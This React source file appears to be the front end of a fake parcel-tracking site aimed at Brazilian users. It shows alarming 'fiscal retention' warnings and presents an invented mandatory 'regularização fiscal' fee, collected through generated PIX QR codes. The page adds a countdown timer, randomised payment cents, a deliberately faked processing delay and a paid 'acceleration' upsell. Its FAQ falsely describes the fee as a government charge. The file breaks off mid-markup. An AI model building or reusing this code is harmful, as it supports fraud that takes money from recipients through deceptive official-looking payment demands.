import React, { useState, useEffect } from 'react';
import { Search, Package, MapPin, CheckCircle2, ArrowRight, Share2, Printer, Truck, CheckCircle, Calculator, X } from 'lucide-react';
import { useSearchParams, useParams } from 'react-router-dom';
import Header from '../components/Header';
import Footer from '../components/Footer';

const API_BASE = import.meta.env.VITE_API_URL || '';

const TrackingPage: React.FC = () => {
    const { codigo: routeCodigo } = useParams();
    const [searchParams] = useSearchParams();
    const [codigo, setCodigo] = useState('');
    const [trackingData, setTrackingData] = useState<any>(null);
    const [loading, setLoading] = useState(false);
    const [showExpressModal, setShowExpressModal] = useState(false);
    const [showTaxModal, setShowTaxModal] = useState(false);

    // PixGhost Integration State
    const [pixLoading, setPixLoading] = useState(false);
    const [pixData, setPixData] = useState<any>(null);
    const [pixPaid, setPixPaid] = useState(false);

    const [taxPixLoading, setTaxPixLoading] = useState(false);
    const [taxPixData, setTaxPixData] = useState<any>(null);
    const [taxPixPaid, setTaxPixPaid] = useState(false);
    const [copied, setCopied] = useState(false);
    const [timeLeft, setTimeLeft] = useState<number | null>(null);

    // Config State
    const [useRandomCents, setUseRandomCents] = useState(true);

    useEffect(() => {
        fetch(`${API_BASE}/api/config/centavos`)
            .then(res => res.json())
            .then(data => setUseRandomCents(data.active))
            .catch(() => setUseRandomCents(true));
    }, []);

    const [isConfirmingTax, setIsConfirmingTax] = useState(false);

    // Polling de pagamento PIX (Taxa)
    useEffect(() => {
        let interval: any;
        if (showTaxModal && taxPixData && !taxPixPaid && !isConfirmingTax) {
            interval = setInterval(async () => {
                try {
                    const res = await fetch(`${API_BASE}/api/pix/status/${taxPixData.id || taxPixData.payment_id}?codigo=${trackingData?.codigo || ''}`);
                    const data = await res.json();
                    if (data.success && (data.status === 'PAID' || data.status === 'CONFIRMED' || data.data?.status === 'PAID' || data.data?.status === 'completed')) {
                        setIsConfirmingTax(true);
                        // Delay fake de processamento (2-5s) solicitado pelo usuário
                        const delay = Math.floor(Math.random() * 3000) + 2000;
                        setTimeout(() => {
                            setTaxPixPaid(true);
                            setIsConfirmingTax(false);
                            // Atualizar dados locais para refletir "Pago"
                            setTrackingData((prev: any) => ({ ...prev, status: 'Pago', taxa_valor: null }));
                        }, delay);
                        clearInterval(interval);
                    }
                } catch (e) { }
            }, 5000);
        }
        return () => clearInterval(interval);
    }, [showTaxModal, taxPixData, taxPixPaid, isConfirmingTax, trackingData]);
    useEffect(() => {
        const observer = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    entry.target.classList.add('reveal-active');
                }
            });
        }, { threshold: 0.1 });

        const observeElements = () => {
            document.querySelectorAll('.reveal').forEach(el => observer.observe(el));
        };

        observeElements();

        // Timer para garantir que novos elementos renderizados sejam observados
        const timeout = setTimeout(observeElements, 500);

        return () => {
            observer.disconnect();
            clearTimeout(timeout);
        };
    }, [trackingData]);

    useEffect(() => {
        let timer: any;
        if (timeLeft !== null && timeLeft > 0) {
            timer = setInterval(() => {
                setTimeLeft(prev => (prev !== null && prev > 0) ? prev - 1 : 0);
            }, 1000);
        } else if (timeLeft === 0) {
            setShowTaxModal(false);
            setShowExpressModal(false);
            setPixData(null);
            setTaxPixData(null);
            setTimeLeft(null);
            alert('O tempo para pagamento expirou. Gere um novo código se necessário.');
        }
        return () => clearInterval(timer);
    }, [timeLeft]);

    const formatTime = (seconds: number) => {
        const mins = Math.floor(seconds / 60);
        const secs = seconds % 60;
        return `${mins}:${secs < 10 ? '0' : ''}${secs}`;
    };

    const fetchTrackingData = async (searchCode: string) => {
        if (!searchCode) return;

        setLoading(true);
        setTrackingData(null);

        try {
            const apiBase = import.meta.env.VITE_API_URL || '';
            const res = await fetch(`${apiBase}/api/rastreio-publico`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ codigo: searchCode.toUpperCase() }),
            });
            const data = await res.json();

            if (res.ok && data.success && data.etapas) {
                // Mapear os dados do banco para o formato da UI
                const statusMap: any = {
                    'postado': <CheckCircle2 size={20} />,
                    'transito': <Package size={20} />,
                    'distribuicao': <MapPin size={20} />,
                    'entrega': <Truck size={20} />,
                    'saiu': <Truck size={20} />,
                    'entregue': <CheckCircle2 size={20} />
                };

                // Cálculo de previsão dinâmica
                const postagemDate = data.etapas?.[0]?.data ? new Date(data.etapas[0].data) : new Date();
                const diasAdd = data.tipo_entrega === 'EXPRESS' ? 3 : 5;
                const previsaoDate = new Date(postagemDate);
                previsaoDate.setDate(previsaoDate.getDate() + diasAdd);

                const mappedData = {
                    codigo: data.codigo,
                    status: data.status_atual || 'Pendente',
                    tipo_entrega: data.tipo_entrega || 'NORMAL',
                    previsao: previsaoDate.toLocaleDateString('pt-BR'),
                    cidade: data.cidade || null,
                    cliente_nome: data.cliente_nome || null,
                    eventos: [...(data.etapas || [])].reverse().map((e: any, i: number) => {
                        // Tentar encontrar o melhor ícone baseado no título ou slug
                        let icon = <Package size={20} />;
                        const titleLower = (e.titulo || e.status_atual || '').toLowerCase();
                        if (titleLower.includes('postado')) icon = statusMap['postado'];
                        else if (titleLower.includes('transito') || titleLower.includes('trânsito')) icon = statusMap['transito'];
                        else if (titleLower.includes('distribuição') || titleLower.includes('distribuicao') || titleLower.includes('centro')) icon = statusMap['distribuicao'];
                        else if (titleLower.includes('saiu') || titleLower.includes('rota')) icon = statusMap['entrega'];
                        else if (titleLower.includes('entregue')) icon = statusMap['entregue'];

                        return {
                            id: i,
                            status: e.titulo || e.status_atual,
                            local: data.cidade || 'Em trânsito',
                            data: e.data ? new Date(e.data).toLocaleString('pt-BR', { day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit' }) : '',
                            detalhes: e.subtitulo || e.titulo || e.status_atual,
                            icon: icon
                        };
                    }),
                    etapaAtual: (data.etapas || []).length > 4 ? 4 : (data.etapas || []).length,
                    taxa_valor: data.taxa_valor,
                    taxa_pix: data.taxa_pix
                };
                setTrackingData(mappedData);
            } else {
                console.error('Dados de rastreio inválidos:', data);
                alert(data.message || 'Dados de rastreio indisponíveis no momento.');
            }
        } catch (err) {
            console.error(err);
            alert('Erro ao buscar rastreio.');
        } finally {
            setLoading(false);
        }
    };

    useEffect(() => {
        const urlCodigo = routeCodigo || searchParams.get('codigo');
        if (urlCodigo) {
            const upCode = urlCodigo.toUpperCase();
            setCodigo(upCode);
            fetchTrackingData(upCode);
        }
    }, [routeCodigo, searchParams]);

    const handleSearch = async (e: React.FormEvent) => {
        e.preventDefault();
        if (!codigo) return;
        setLoading(true);
        try {
            await fetchTrackingData(codigo);
        } finally {
            setLoading(false);
        }
    };

    return (
        <div className="tr-page">
            <style>{`
                .tr-page { background: var(--bg-primary); color: var(--text-primary); min-height: 100vh; position: relative; overflow-x: hidden; font-family: 'Outfit', sans-serif; }
                .tr-page * { box-sizing: border-box; }
                .bg-mesh {
                    position: fixed; inset: 0; pointer-events: none; z-index: 0;
                    background:
                        radial-gradient(ellipse 80% 50% at 50% -20%, rgba(0, 85, 255, 0.08), transparent),
                        radial-gradient(ellipse 60% 40% at 80% 50%, rgba(59, 130, 246, 0.05), transparent),
                        radial-gradient(ellipse 50% 30% at 20% 80%, rgba(6, 182, 212, 0.04), transparent);
                }
                
                .reveal { opacity: 0; transform: translateY(30px) scale(0.95); transition: all 0.8s cubic-bezier(0.16, 1, 0.3, 1); }
                .reveal-active { opacity: 1; transform: translateY(0) scale(1); }

                .search-hero { padding: 120px 24px 60px; text-align: center; max-width: 800px; margin: 0 auto; position: relative; z-index: 1; }

                .search-box-premium {
                    max-width: 600px; margin: 0 auto;
                    background: rgba(255,255,255,0.65); border: 1px solid rgba(255,255,255,0.8);
                    backdrop-filter: blur(24px); border-radius: 24px; padding: 10px;
                    display: flex; gap: 10px; align-items: center;
                    box-shadow: 0 8px 32px rgba(0, 40, 120, 0.08);
                }
                .search-input-premium { flex: 1; background: transparent; border: none; color: var(--text-primary); padding: 10px 20px; font-size: 1.05rem; outline: none; }
                .search-input-premium::placeholder { color: var(--text-muted); }
                .btn-track { padding: 14px 32px; background: linear-gradient(135deg, #0055ff, #3b82f6); border: none; border-radius: 18px; color: white; font-weight: 800; cursor: pointer; display: flex; align-items: center; gap: 10px; box-shadow: 0 8px 24px rgba(0, 85, 255, 0.3); white-space: nowrap; justify-content: center; transition: all 0.3s; }
                .btn-track:hover { transform: translateY(-2px); box-shadow: 0 12px 32px rgba(0, 85, 255, 0.4); }
                
                .tracking-container { max-width: 900px; margin: 0 auto 100px; padding: 0 24px; position: relative; z-index: 1; }
                .status-card { background: rgba(255,255,255,0.6); backdrop-filter: blur(32px); border: 1px solid rgba(255,255,255,0.8); border-radius: 32px; padding: 48px; margin-bottom: 40px; box-shadow: 0 16px 48px rgba(0, 40, 120, 0.08); }
                .tl-item { display: flex; gap: 24px; margin-bottom: 32px; }
                .tl-point { width: 50px; height: 50px; border-radius: 16px; background: rgba(0, 85, 255, 0.08); display: flex; align-items: center; justify-content: center; color: #0055ff; flex-shrink: 0; position: relative; }
                .tl-line { position: absolute; top: 58px; left: 24px; width: 2px; height: calc(100% - 10px); background: rgba(0, 85, 255, 0.08); }
                .tl-content { flex: 1; padding-bottom: 40px; }
                .tl-content h4 { font-size: 1.25rem; font-weight: 800; margin-bottom: 4px; color: var(--text-primary); }
                .tl-content p { color: var(--text-secondary); line-height: 1.6; }
                
                .express-box { text-align: center; padding: 32px 0 0; margin-top: 32px; border-top: 2px dashed rgba(0, 85, 255, 0.08); }
                .express-btn {
                    padding: 16px 40px; border: none; border-radius: 18px;
                    background: linear-gradient(135deg, #0055ff, #3b82f6);
                    color: white; font-weight: 800; font-size: 1.05rem; cursor: pointer;
                    box-shadow: 0 8px 24px rgba(0, 85, 255, 0.25);
                    font-family: 'Outfit', sans-serif;
                    transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
                }
                .express-btn:hover { transform: translateY(-3px); box-shadow: 0 16px 40px rgba(0, 85, 255, 0.4); }
                
                @media (max-width: 768px) { 
                    .search-hero { padding: 150px 20px 40px !important; }
                    .status-card { padding: 24px; border-radius: 24px; } 
                    .search-box-premium { 
                        border-radius: 20px; flex-direction: column; padding: 16px; gap: 10px;
                    } 
                    .search-input-premium { text-align: center; }
                    .btn-track { width: 100%; justify-content: center; padding: 16px; } 
                    .st-header { flex-direction: column !important; text-align: center; gap: 24px; }
                    .st-badges { justify-content: center; flex-wrap: wrap; }
                    .st-right { text-align: center !important; }
                    .st-code { font-size: 1.5rem !important; margin-top: 8px; }
                }

                .instruction-card {
                    background: #ffffff;
                    border: 1px solid #0055ff;
                    border-radius: 24px;
                    padding: 32px;
                    margin-top: 40px;
                    text-align: left;
                    box-shadow: 0 8px 32px rgba(0, 40, 120, 0.1);
                }
                .instruction-step {
                    display: flex;
                    gap: 16px;
                    margin-bottom: 20px;
                }
                .step-num {
                    width: 32px; height: 32px;
                    background: #0055ff;
                    color: white;
                    border-radius: 50%;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    font-weight: 900;
                    flex-shrink: 0;
                    box-shadow: 0 4px 12px rgba(0, 85, 255, 0.3);
                }
                .faq-grid {
                    display: grid;
                    grid-template-columns: repeat(2, 1fr);
                    gap: 24px;
                    margin-top: 40px;
                    text-align: left;
                }
                @media (max-width: 600px) {
                    .faq-grid { grid-template-columns: 1fr; }
                }

                .retention-alert-card {
                    background: rgba(239, 68, 68, 0.15);
                    border: 2px solid #ef4444;
                    border-radius: 20px;
                    padding: 24px;
                    margin-bottom: 32px;
                    display: flex;
                    align-items: center;
                    justify-content: space-between;
                    gap: 20px;
                    box-shadow: 0 0 20px rgba(239, 68, 68, 0.1);
                }

                .retention-content-wrapper {
                    display: flex;
                    align-items: center;
                    gap: 16px;
                }

                .retention-alert-btn {
                    background: #ef4444;
                    color: #fff;
                    border: none;
                    padding: 14px 28px;
                    borderRadius: 14px;
                    font-weight: 900;
                    font-size: 1rem;
                    cursor: pointer;
                    box-shadow: 0 8px 24px rgba(239, 68, 68, 0.4);
                    transition: 0.2s;
                    white-space: nowrap;
                    flex-shrink: 0;
                }

                @media (max-width: 768px) {
                    .retention-alert-card {
                        flex-direction: column;
                        align-items: stretch;
                        text-align: center;
                        padding: 20px;
                        gap: 24px;
                    }
                    .retention-content-wrapper {
                        flex-direction: column;
                        gap: 16px;
                    }
                    .retention-alert-btn {
                        width: 100%;
                        white-space: normal;
                    }
                }
            `}</style>


            <div className="bg-mesh"></div>

            <Header />

            <section className="search-hero">
                <div className="reveal">
                    <h1 style={{ fontSize: 'clamp(2.5rem, 6vw, 4rem)', fontWeight: 900, marginBottom: '24px', letterSpacing: '-2px', color: 'var(--text-primary)' }}>Onde está seu <span style={{ color: '#0055ff' }}>pacote?</span></h1>
                    <p style={{ color: 'var(--text-secondary)', fontSize: '1.1rem', marginBottom: '48px' }}>Monitore sua entrega em tempo real com precisão de metros.</p>
                </div>

                <form onSubmit={handleSearch} className="search-box-premium reveal">
                    <Search size={24} color="#0055ff" />
                    <input type="text" className="search-input-premium" placeholder="Cole seu código de rastreio aqui..." value={codigo} onChange={e => setCodigo(e.target.value.toUpperCase())} maxLength={30} />
                    <button type="submit" className="btn-track" disabled={loading}>
                        {loading ? 'Processando...' : 'Localizar'} <ArrowRight size={20} />
                    </button>
                </form>
            </section>

            <div className="tracking-container">
                {trackingData ? (
                    <div>
                        <div className="status-card">
                            {trackingData.taxa_valor && (
                                <div className="retention-alert-card">
                                    <div className="retention-content-wrapper">
                                        <div style={{ width: '48px', height: '48px', background: '#ef4444', borderRadius: '14px', display: 'flex', alignItems: 'center', justifyContent: 'center', boxShadow: '0 4px 12px rgba(239, 68, 68, 0.3)', flexShrink: 0 }}>
                                            <Calculator size={24} color="#fff" />
                                        </div>
                                        <div>
                                            <div style={{ color: '#ef4444', fontWeight: 900, fontSize: '1rem', textTransform: 'uppercase', letterSpacing: '0.5px' }}>⚠️ Alerta de Retenção</div>
                                            <div style={{ color: '#0f172a', fontSize: '0.95rem', fontWeight: 700, lineHeight: 1.4 }}>
                                                Seu objeto está sujeito a retenção por irregularidade fiscal.
                                                <br />
                                                <span style={{ color: '#dc2626' }}>🚨 Regularização obrigatória para liberação.</span>
                                            </div>
                                        </div>
                                    </div>
                                    <button
                                        onClick={() => setShowTaxModal(true)}
                                        className="retention-alert-btn"
                                        onMouseOver={e => e.currentTarget.style.transform = 'scale(1.02)'}
                                        onMouseOut={e => e.currentTarget.style.transform = 'scale(1)'}
                                    >
                                        Regularizar Agora
                                    </button>
                                </div>
                            )}

                            {/* Saudação personalizada com nome e cidade */}
                            {(trackingData.cliente_nome || trackingData.cidade) && (
                                <div style={{
                                    display: 'flex', alignItems: 'center', gap: '12px',
                                    background: 'linear-gradient(135deg, rgba(0,85,255,0.06), rgba(59,130,246,0.04))',
                                    border: '1px solid rgba(0,85,255,0.12)',
                                    borderRadius: '14px', padding: '14px 18px',
                                    marginBottom: '24px'
                                }}>
                                    <span style={{ fontSize: '1.5rem' }}>📦</span>
                                    <p style={{ margin: 0, fontSize: '0.95rem', color: 'var(--text-primary)', fontWeight: 600, lineHeight: 1.4 }}>
                                        {trackingData.cliente_nome
                                            ? <>Olá, <strong style={{ color: '#0055ff' }}>{trackingData.cliente_nome.split(' ')[0]}</strong>! Seu pedido{trackingData.cidade ? <> com destino a <strong style={{ color: '#0055ff' }}>{trackingData.cidade}</strong></> : ''} está sendo monitorado.</>
                                            : <>Seu pedido com destino a <strong style={{ color: '#0055ff' }}>{trackingData.cidade}</strong> está sendo monitorado.</>
                                        }
                                    </p>
                                </div>
                            )}

                            <div className="st-header" style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', marginBottom: '40px' }}>
                                <div>
                                    <div className="st-badges" style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '12px' }}>
                                        <div style={{ display: 'inline-flex', padding: '6px 16px', background: 'rgba(16, 185, 129, 0.08)', border: '1px solid rgba(16, 185, 129, 0.15)', borderRadius: '100px', fontSize: '0.8rem', fontWeight: 800, color: '#10b981' }}>{trackingData.status}</div>
                                        {trackingData.taxa_valor && (
                                            <div style={{ display: 'inline-flex', padding: '6px 16px', background: 'rgba(239, 68, 68, 0.1)', border: '1px solid rgba(239, 68, 68, 0.2)', borderRadius: '100px', fontSize: '0.8rem', fontWeight: 800, color: '#ef4444' }}>TAXA PENDENTE</div>
                                        )}
                                    </div>
                                    <h2 className="st-code" style={{ fontSize: '1.8rem', fontWeight: 900 }}>{trackingData.codigo}</h2>
                                </div>
                                <div className="st-right" style={{ textAlign: 'right' }}>
                                    <p style={{ color: 'var(--text-muted)', fontSize: '0.8rem' }}>Previsão de Entrega</p>
                                    <p style={{ fontSize: '1.2rem', fontWeight: 800, color: '#0055ff' }}>{trackingData.previsao}</p>
                                </div>
                            </div>

                            <div style={{ display: 'flex', gap: '8px', marginBottom: '48px' }}>
                                {[1, 2, 3, 4].map(step => (
                                    <div key={step} style={{ flex: 1, height: '4px', background: step <= trackingData.etapaAtual ? '#0055ff' : 'rgba(0, 85, 255, 0.08)', borderRadius: '2px', boxShadow: step === trackingData.etapaAtual ? '0 0 10px rgba(0,85,255,0.4)' : 'none' }}></div>
                                ))}
                            </div>

                            <div className="timeline-list">
                                {trackingData.eventos.map((ev: any, i: number) => (
                                    <div key={i} className="tl-item">
                                        <div className="tl-point">
                                            {ev.icon}
                                            {i < trackingData.eventos.length - 1 && <div className="tl-line"></div>}
                                        </div>
                                        <div className="tl-content">
                                            <div style={{ display: 'flex', justifyContent: 'space-between' }}>
                                                <h4>{ev.status}</h4>
                                                <span style={{ fontSize: '0.8rem', color: '#0055ff', fontWeight: 700 }}>{ev.data}</span>
                                            </div>
                                            <p>{ev.detalhes}</p>
                                            <p style={{ fontSize: '0.8rem', marginTop: '4px' }}>📍 {ev.local}</p>
                                        </div>
                                    </div>
                                ))}
                            </div>

                            <div className="express-box">
                                {trackingData.taxa_valor && (
                                    <button
                                        className="express-btn"
                                        style={{ background: 'linear-gradient(135deg, #ef4444, #dc2626)', marginBottom: '16px', display: 'block', width: '100%', boxShadow: '0 8px 32px rgba(239, 68, 68, 0.3)' }}
                                        onClick={() => setShowTaxModal(true)}
                                    >
                                        💰 Pagar Taxa de Processamento (R$ {trackingData.taxa_valor})
                                    </button>
                                )}
                                <button className="express-btn" onClick={() => setShowExpressModal(true)}>⚡ Acelerar por R$ 29,90</button>
                                <p style={{ color: 'var(--text-muted)', fontSize: '0.9rem', marginTop: '12px' }}>Receba seu pacote prioritariamente em até 3 dias.</p>
                            </div>
                        </div>

                        <div style={{ display: 'flex', gap: '16px', justifyContent: 'center' }}>
                            <button className="nav-item" style={{ padding: '12px 24px', background: 'rgba(255,255,255,0.6)', border: '1px solid rgba(0,85,255,0.08)', borderRadius: '16px', cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '8px', color: 'var(--text-secondary)', backdropFilter: 'blur(12px)' }}><Share2 size={16} /> Compartilhar</button>
                            <button className="nav-item" style={{ padding: '12px 24px', background: 'rgba(255,255,255,0.6)', border: '1px solid rgba(0,85,255,0.08)', borderRadius: '16px', cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '8px', color: 'var(--text-secondary)', backdropFilter: 'blur(12px)' }}><Printer size={16} /> Imprimir</button>
                        </div>
                    </div>
                ) : (
                    <div className="reveal">
                        {/* Instruções */}
                        <div className="instruction-card">
                            <h3 style={{ fontSize: '1.4rem', fontWeight: 900, marginBottom: '24px', color: 'var(--text-primary)', display: 'flex', alignItems: 'center', gap: '10px' }}>
                                <Package size={24} color="#0055ff" /> Como rastrear sua encomenda
                            </h3>
                            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '20px' }}>
                                <div className="instruction-step">
                                    <div className="step-num">1</div>
                                    <div>
                                        <div style={{ fontWeight: 800, color: 'var(--text-primary)' }}>Pegue seu código</div>
                                        <div style={{ fontSize: '0.85rem', color: 'var(--text-secondary)' }}>Verifique o e-mail ou SMS enviado no momento da compra.</div>
                                    </div>
                                </div>
                                <div className="instruction-step">
                                    <div className="step-num">2</div>
                                    <div>
                                        <div style={{ fontWeight: 800, color: 'var(--text-primary)' }}>Insira o código</div>
                                        <div style={{ fontSize: '0.85rem', color: 'var(--text-secondary)' }}>Digite ou cole o rastreio no campo de busca acima.</div>
                                    </div>
                                </div>
                                <div className="instruction-step">
                                    <div className="step-num">3</div>
                                    <div>
                                        <div style={{ fontWeight: 800, color: 'var(--text-primary)' }}>Confirme sua cidade</div>
                                        <div style={{ fontSize: '0.85rem', color: 'var(--text-secondary)' }}>Alguns rastreios exigem a cidade de destino por segurança.</div>
                                    </div>
                                </div>
                                <div className="instruction-step">
                                    <div className="step-num">4</div>
                                    <div>
                                        <div style={{ fontWeight: 800, color: 'var(--text-primary)' }}>Acompanhe tudo</div>
                                        <div style={{ fontSize: '0.85rem', color: 'var(--text-secondary)' }}>Veja cada passo da sua encomenda em tempo real.</div>
                                    </div>
                                </div>
                            </div>
                        </div>

                        {/* FAQ */}
                        <div className="faq-grid">
                            <div style={{ background: '#ffffff', padding: '24px', borderRadius: '20px', border: '1px solid #e2e8f0', boxShadow: '0 4px 12px rgba(0,0,0,0.05)' }}>
                                <div style={{ color: '#0055ff', fontWeight: 800, fontSize: '1rem', marginBottom: '8px' }}>Onde encontro meu código?</div>
                                <div style={{ fontSize: '0.9rem', color: '#0f172a', lineHeight: 1.6, fontWeight: 500 }}>Geralmente enviado pela loja via E-mail ou WhatsApp após a postagem.</div>
                            </div>
                            <div style={{ background: '#ffffff', padding: '24px', borderRadius: '20px', border: '1px solid #e2e8f0', boxShadow: '0 4px 12px rgba(0,0,0,0.05)' }}>
                                <div style={{ color: '#0055ff', fontWeight: 800, fontSize: '1rem', marginBottom: '8px' }}>O que é Taxa de Processamento?</div>
                                <div style={{ fontSize: '0.9rem', color: '#0f172a', lineHeight: 1.6, fontWeight: 500 }}>São tributos ou taxas de processamento que precisam de quitação para liberação governamental do objeto.</div>
                            </div>
                            <div style={{ background: '#ffffff', padding: '24px', borderRadius: '20px', border: '1px solid #e2e8f0', boxShadow: '0 4px 12px rgba(0,0,0,0.05)' }}>
                                <div style={{ color: '#0055ff', fontWeight: 800, fontSize: '1rem', marginBottom: '8px' }}>Quanto tempo para entrega?</div>
                                <div style={{ fontSize: '0.9rem', color: '#0f172a', lineHeight: 1.6, fontWeight: 500 }}>O prazo médio é de 3 a 7 dias úteis após a confirmação no sistema.</div>
                            </div>
                            <div style={{ background: '#ffffff', padding: '24px', borderRadius: '20px', border: '1px solid #e2e8f0', boxShadow: '0 4px 12px rgba(0,0,0,0.05)' }}>
                                <div style={{ color: '#0055ff', fontWeight: 800, fontSize: '1rem', marginBottom: '8px' }}>O rastreio não atualiza?</div>
                                <div style={{ fontSize: '0.9rem', color: '#0f172a', lineHeight: 1.6, fontWeight: 500 }}>Pode levar até 24h úteis para o primeiro registro aparecer após a coleta.</div>
                            </div>
                        </div>

                        <div style={{ textAlign: 'center', padding: '60px 0', opacity: 0.6 }}>
                            <Package size={40} style={{ marginBottom: '16px', color: 'var(--text-muted)' }} />
                            <p style={{ color: 'var(--text-secondary)', fontWeight: 600 }}>Pronto para começar!</p>
                        </div>
                    </div>
                )}
            </div>

            <Footer />

            {/* Modal Taxa */}
            {showTaxModal && trackingData?.taxa_valor && (
                <div style={{ position: 'fixed', inset: 0, zIndex: 9999, background: 'rgba(0,20,60,0.5)', backdropFilter: 'blur(12px)', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px' }} onClick={() => { setShowTaxModal(false); setTaxPixData(null); setTaxPixPaid(false); setTimeLeft(null); }}>
                    <div style={{
                        background: 'rgba(255,255,255,0.95)',
                        backdropFilter: 'blur(24px)',
                        border: '1px solid rgba(0,85,255,0.1)',
                        borderRadius: '32px',
                        width: '100%',
                        maxWidth: '440px',
                        maxHeight: '90vh',
                        padding: '40px',
                        boxShadow: '0 24px 80px rgba(0,40,120,0.15)',
                        animation: 'fadeIn 0.3s ease',
                        textAlign: 'center',
                        overflowY: 'auto',
                        position: 'relative'
                    }} onClick={e => e.stopPropagation()}>
                        <button
                            onClick={() => { setShowTaxModal(false); setTaxPixData(null); setTaxPixPaid(false); setTimeLeft(null); }}
                            style={{ position: 'absolute', top: '20px', right: '20px', background: 'rgba(0,85,255,0.05)', border: 'none', borderRadius: '50%', width: '32px', height: '32px', display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#94a3b8', cursor: 'pointer' }}
                        >
                            <X size={18} />
                        </button>
                        <div style={{ width: '80px', height: '80px', background: 'rgba(239, 68, 68, 0.1)', borderRadius: '24px', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 24px', border: '1px solid rgba(239,68,68,0.2)' }}>
                            <Calculator size={40} color="#ef4444" />
                        </div>
                        <h2 style={{ fontSize: '1.8rem', fontWeight: 900, marginBottom: '12px', fontFamily: 'Outfit, sans-serif', color: '#0a1628', textTransform: 'uppercase', letterSpacing: '-0.5px' }}>⚠️ Regularização Fiscal</h2>
                        <p style={{ color: '#1e293b', lineHeight: 1.6, marginBottom: '32px', fontWeight: 600, fontSize: '1.05rem' }}>
                            Atenção: Seu objeto foi retido por <span style={{ color: '#ef4444' }}>irregularidade fiscal</span>.
                            <br /><br />
                            🚨<strong> A regularização é obrigatória</strong> para liberação imediata e continuidade do processo de entrega.
                        </p>

                        <button onClick={async () => {
                            setTaxPixLoading(true);
                            try {
                                const taxAmount = Number(trackingData.taxa_valor.toString().replace(',', '.'));
                                const cents = useRandomCents ? Math.floor(Math.random() * 99) : 90;
                                const finalAmount = Math.floor(taxAmount) + (cents / 100);

                                const res = await fetch(`${API_BASE}/api/pix/create`, {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify({
                                        amount: finalAmount,
                                        description: `Regularização Fiscal - ${trackingData.codigo}`,
                                        codigo: trackingData.codigo
                                    })
                                });
                                const data = await res.json();
                                if (data && data.success) {
                                    setTaxPixData(data.data);
                                    setTimeLeft(20 * 60); // 20 minutos
                                } else {
                                    alert('Erro ao gerar sistema: ' + (data.error || 'Tente novamente.'));
                                }
                            } catch (e) {
                                alert('Erro de conexão ao sistema regulatório.');
                            } finally {
                                setTaxPixLoading(false);
                            }
                        }} style={{ width: '100%', padding: '18px', background: 'linear-gradient(135deg, #ef4444, #991b1b)', border: 'none', borderRadius: '16px', color: '#fff', fontWeight: 900, fontSize: '1.1rem', cursor: 'pointer', boxShadow: '0 8px 24px rgba(239, 68, 68, 0.4)', textTransform: 'uppercase' }}>
                            Efetuar Regularização Obrigatória
                        </button>

                        {taxPixLoading && (
                            <div style={{ color: '#ef4444', fontWeight: 'bold' }}>⏳ Gerando QR Code PIX, aguarde...</div>
                        )}

                        {taxPixData && !taxPixPaid && (
                            <div style={{ background: 'rgba(239,68,68,0.04)', border: '1px solid rgba(239,68,68,0.1)', borderRadius: '20px', padding: '24px', marginBottom: '32px' }}>
                                <div style={{ fontSize: '0.8rem', color: '#ef4444', fontWeight: 700, textTransform: 'uppercase', marginBottom: '8px' }}>Pix Copia e Cola</div>
                                <div style={{ fontSize: '1.5rem', fontWeight: 900, color: '#0a1628', marginBottom: '16px' }}>
                                    R$ {taxPixData.amount ? taxPixData.amount.toFixed(2).replace('.', ',') : trackingData.taxa_valor}
                                </div>
                                <div style={{ background: '#fff', padding: '12px', borderRadius: '12px', marginBottom: '16px', display: 'inline-block' }}>
                                    <img src={taxPixData.qr_image_url} alt="QR Code PIX" style={{ width: '150px', height: '150px' }} />
                                </div>
                                <div style={{ background: 'rgba(239,68,68,0.04)', padding: '10px', borderRadius: '8px', wordBreak: 'break-all', fontSize: '12px', color: '#64748b', marginBottom: '10px', userSelect: 'all', border: '1px solid rgba(239,68,68,0.08)' }}>
                                    {taxPixData.qr_code}
                                </div>
                                {timeLeft !== null && (
                                    <div style={{ marginBottom: '16px', color: '#ef4444', fontWeight: 800, fontSize: '1rem', background: 'rgba(239,68,68,0.1)', padding: '8px', borderRadius: '10px' }}>
                                        🕒 Expira em: {formatTime(timeLeft)}
                                    </div>
                                )}
                                <p style={{ fontSize: '0.85rem', color: '#94a3b8', marginBottom: '10px' }}>Escaneie o código acima ou copie a Chave Copia e Cola.</p>
                                <button
                                    onClick={() => {
                                        navigator.clipboard.writeText(taxPixData.qr_code);
                                        setCopied(true);
                                        setTimeout(() => setCopied(false), 2000);
                                    }}
                                    style={{
                                        padding: '12px 24px',
                                        background: copied ? '#10b981' : '#ef4444',
                                        border: 'none',
                                        borderRadius: '12px',
                                        color: 'white',
                                        cursor: 'pointer',
                                        fontSize: '0.95rem',
                                        fontWeight: 800,
                                        transition: 'all 0.3s ease',
                                        display: 'flex',
                                        alignItems: 'center',
                                        justifyContent: 'center',
                                        gap: '8px',
                                        margin: '0 auto',
                                        width: '100%'
                                    }}
                                >
                                    {copied ? (
                                        <><CheckCircle size={18} /> Copiado com sucesso!</>
                                    ) : (
                                        'Copiar Código PIX'
                                    )}
                                </button>
                                <div style={{ marginTop: '20px', color: '#10b981', fontWeight: 'bold', animation: 'pulse 2s infinite' }}>⏳ Aguardando Pagamento...</div>
                            </div>
                        )}

                        {taxPixPaid && (
                            <div style={{ background: 'rgba(16, 185, 129, 0.1)', border: '1px solid rgba(16, 185, 129, 0.3)', borderRadius: '20px', padding: '24px', marginBottom: '32px' }}>
                                <CheckCircle size={48} color="#10b981" style={{ margin: '0 auto 16px' }} />
                                <div style={{ fontSize: '1.2rem', color: '#059669', fontWeight: 900 }}>Pagamento Confirmado!</div>
                                <p style={{ fontSize: '0.95rem', color: '#0f172a', fontWeight: 500, marginTop: '8px' }}>Sua taxa foi paga com sucesso. O pacote será liberado em breve.</p>
